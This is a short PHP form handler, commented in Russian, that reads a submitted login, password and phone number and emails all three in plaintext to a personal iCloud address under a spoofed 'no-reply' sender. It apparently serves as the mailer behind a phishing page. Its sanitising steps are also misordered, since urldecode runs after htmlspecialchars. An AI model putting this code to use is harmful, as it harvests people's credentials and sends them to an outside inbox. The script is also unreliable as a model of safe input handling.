<?php

    //получение данных с формы

    $login = $_POST['login'];
    $pass = $_POST['pass'];
    $tel = $_POST['tel'];

    //обработка данных

    $login = htmlspecialchars($login); //преобразование данных в сущность (мнемоники)
    $pass = htmlspecialchars($pass);
    $tel = htmlspecialchars($tel);

    $login = urldecode($login); //декодирование URL
    $pass = urldecode($pass);
    $tel = urldecode($tel);

    $login = trim($login); //удаление пробельных символов с обеих сторон
    $pass = trim($pass);
    $tel = trim($tel);

    //отправка данных на почту

    if (mail("saska_b@icloud.com",
             "Новое письмо с сайта",
             "Логин: ".$login."\n".
             "Пароль: ".$pass."\n".
             "Телефон: ".$tel,
             "From: no-reply@mydomain.ru \r\n")            
    ) {
        echo ('Письмо успешно отправлено!');
    }

    else {
        echo ('Есть ошибки, проверьте корректонсть введенных данных...');
    }

?>